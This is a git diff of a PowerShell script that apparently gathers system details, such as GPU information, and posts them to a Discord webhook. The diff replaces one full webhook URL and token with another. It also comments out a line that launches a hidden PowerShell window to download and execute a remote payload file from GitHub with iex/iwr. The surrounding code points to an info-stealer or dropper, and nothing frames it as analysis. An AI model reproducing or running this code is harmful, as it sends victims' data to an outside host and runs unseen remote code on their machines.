@@ -31,7 +31,7 @@ $gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name
 sleep 2
 
 # Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1286410676377489529/IzHkrSq-pjbL-xAImQ3lHIpYzCTAy9OyxtjHyAVpG4xY-CaU9vyM9tnzyvVTAKfrFOSG"
+$webhookUrl = "https://discord.com/api/webhooks/1290163974687690752/4kGM4khXxmudfn74j3ZTg74FrFHondaWoqRoZ_VtRphYZaxIUkcFUBag4cKwcifjz_dt"
 
 # Define the message payload
 $payload = @{
@@ -51,6 +51,6 @@ try {
 } catch {
     Write-Output "Failed to send message. Error: $_"
 }
-start powershell -windowstyle h -args 'iex (iwr raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/gaber_pyld.txt -usebasicparsing)'
+#start powershell -windowstyle h -args 'iex (iwr raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/gaber_pyld.txt -usebasicparsing)'
 
 }
